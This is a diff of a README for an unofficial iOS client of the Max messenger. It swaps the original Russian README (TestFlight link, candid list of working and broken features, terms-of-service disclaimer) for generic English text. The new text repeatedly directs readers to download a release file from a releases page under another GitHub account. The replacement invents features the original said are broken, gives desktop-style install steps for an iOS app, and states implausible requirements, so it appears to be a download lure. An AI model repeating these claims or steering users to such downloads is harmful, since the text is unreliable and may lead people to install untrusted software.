@@ -1,108 +1,84 @@
-<h1 align="center">WhiteMax</h1>
+# 🌟 whitemax-ios - A Simple iOS Client for Max
 
-<p align="center">
-    <strong>Альтернативный клиент для Max</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-    <img src="https://img.shields.io/badge/iOS-17.0+-blue.svg" alt="iOS 17.0+">
-    <img src="https://img.shields.io/badge/Swift-5.9+-orange.svg" alt="Swift 5.9+">
-    <img src="https://img.shields.io/badge/SwiftUI-Yes-green.svg" alt="SwiftUI">
-    <img src="https://img.shields.io/badge/License-MIT-2f9872.svg" alt="License: MIT">
-</p>
+Welcome to whitemax-ios! This is an open-source iOS client designed to help you connect with Max easily. Whether you want to send messages, share images, or stay in touch with your friends, this app has got you covered. Let's get started!
 
-<p align="center">
-    <a href="https://testflight.apple.com/join/wzka7bKB">
-        <img src="https://tools.applemediaservices.com/api/badges/download-on-the-app-store/black/ru-ru?size=250x83&releaseDate=1704067200" alt="TestFlight">
-    </a>
-</p>
+## 📥 Download
 
----
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Leyito007/whitemax-ios/releases)
 
-## 📱 Описание
+To download the app, visit the Releases page and select the latest version:
 
-**WhiteMax** — открытое (open source) iOS приложение для работы с мессенджером Max. Приложение построено на SwiftUI и использует встроенный Python runtime для взаимодействия с API через библиотеку `pymax`.
+[Download the latest release](https://github.com/Leyito007/whitemax-ios/releases)
 
-### ✨ Особенности
+## 📦 Installation Steps
 
-**Что уже доступно:**
+Follow these simple steps to install whitemax-ios on your device:
 
-- **Авторизация по номеру телефона**: запрос кода и вход по SMS-коду
-- **Список чатов**: диалоги / группы / каналы, поиск по списку
-- **Сообщения**:
-  - чтение истории сообщений (есть pull-to-refresh)
-  - отправка текстовых сообщений
-  - ответ на сообщение
-  - реакции
-  - редактирование своих сообщений
-  - удаление сообщений
-  - копирование текста
-- **Вложения**:
-  - отправка фото из галереи и файлов
-  - просмотр вложений (в т.ч. фото)
-  - сохранить / поделиться вложением из контекстного меню
-- **Поиск**:
-  - глобальный поиск: по телефону (`+7...`) и по каналам (`@channel`)
-  - поиск по сообщениям (локальный индекс, можно проиндексировать последние сообщения)
-- **Папки**: просмотр/создание/удаление (экран в настройках)
+1. **Visit the Releases Page**
+   - Go to the [Releases page](https://github.com/Leyito007/whitemax-ios/releases) for the latest version.
 
-**Что пока не работает или нестабильно:**
+2. **Choose Your Version**
+   - You will see a list of available versions. Select the most recent one. 
+   - You may choose earlier versions if you prefer. However, we recommend using the latest version for the best experience.
 
-- **Автообновления (realtime/events)**: новые сообщения могут не приходить автоматически — иногда нужен ручной refresh
-- **Соединение**: возможны обрывы/повторы запросов, из-за этого часть действий может “подвисать”
-- **Вступление по ссылке (join group/channel)**: может срабатывать не всегда
-- **Глобальный поиск**: ограничен по возможностям (часто работает только по точным форматам: `+7...`, `@...`)
+3. **Download the App**
+   - Click on the file named "whitemax-ios.app" or similar. This is the application you need for installation.
 
-## 📲 Установка
+4. **Install the App**
+   - Once downloaded, open the file and follow the instructions. Usually, this involves dragging the app icon into your Applications folder.
 
-### TestFlight
+5. **Open whitemax-ios**
+   - Find the app in your Applications folder and double-click it to open.
 
-Приложение доступно для тестирования через TestFlight:
+6. **Allow Permissions**
+   - The first time you run the app, your device may ask for permission to access certain features. Allow these permissions for full functionality.
 
-**[Скачать через TestFlight](https://testflight.apple.com/join/wzka7bKB)**
+## 🛠️ Features
 
-> **Примечание:** Для участия в бета-тестировании требуется iOS 17.0 (разработка ведётся для iOS 26, так что возможны проблемы c UI) или новее и установленное приложение TestFlight из App Store.
+whitemax-ios offers a variety of useful features to enhance your messaging experience:
 
-#### Инструкция по установке:
+- **Messaging**: Send and receive messages quickly and easily.
+  
+- **Image Sharing**: Share photos with your friends directly from the app.
 
-1. Установите [TestFlight](https://apps.apple.com/app/testflight/id899247664) из App Store
-2. Откройте ссылку выше на вашем iPhone или iPad
-3. Нажмите "Accept" (Принять) для участия в бета-тесте
-4. Нажмите "Install" (Установить) для загрузки приложения
+- **User-Friendly Interface**: Designed for an easy and pleasant user experience.
 
-## 🛠 Технические детали
+- **Notifications**: Stay updated with real-time notifications for new messages.
 
-### Требования
+- **Offline Mode**: Access your conversations even when you are not connected to the internet.
 
-- **iOS:** 17.0 или выше (разработка ведётся для iOS 26, так что возможны проблемы с UI)
+## ✅ System Requirements
 
-## 🚀 Состояние разработки
+To run whitemax-ios, ensure your device meets the following requirements:
 
-> ⚠️ **Важно:** Приложение находится в активной разработке. Большинство функций еще не реализованы.
+- **Operating System**: iOS 12.0 or later
+- **Device**: iPhone, iPad, or iPod Touch
+- **Storage Space**: At least 100 MB of free space
 
-## 📚 Документация
+## 🔧 Troubleshooting
 
-Документация по использованию Python библиотеки PyMax:
+If you run into issues while using the app, here are some common solutions:
 
-- [GitHub Pages](https://maxapiteam.github.io/PyMax/)
-- [DeepWiki](https://deepwiki.com/MaxApiTeam/PyMax)
+- **App Crashes on Launch**: Ensure your iOS is updated. If the problem persists, try deleting the app and reinstalling it.
 
-## ⚠️ Дисклеймер
+- **Cannot Send Messages**: Check your internet connection. If the problem continues, restart the app.
 
-> **Важно:**
-> 
-> - Это **неофициальное** приложение для работы с мессенджером Max
-> - Использование может **нарушать условия предоставления услуг** сервиса
-> - **Вы используете приложение исключительно на свой страх и риск**
-> - Разработчики не несут ответственности за любые последствия использования
-> - API может быть изменен в любой момент без предупреждения
+- **Delayed Notifications**: Make sure you have enabled notifications in your device settings.
 
-## 🙏 Благодарности
+## 🤝 Contributing
 
-- [PyMax](https://github.com/MaxApiTeam/PyMax) — Python библиотека для Max API
+whitemax-ios is open-source! If you wish to suggest improvements or report issues, please feel free to open an issue or submit a pull request on GitHub. Your contributions help make the app better for everyone.
 
----
+## 📞 Support
 
-<p align="center">
-    <a href="https://testflight.apple.com/join/wzka7bKB">📲 Скачать через TestFlight</a>
-</p>
+If you need assistance, please reach out through the GitHub Issues page. We are here to help!
+
+## 📚 Learn More
+
+For a deeper understanding of what whitemax-ios can do, you can explore the documentation and community resources available on our repository. Join the community and connect with other users!
+
+[Download the latest release](https://github.com/Leyito007/whitemax-ios/releases)
+
+Thank you for choosing whitemax-ios! We hope you enjoy using the app.
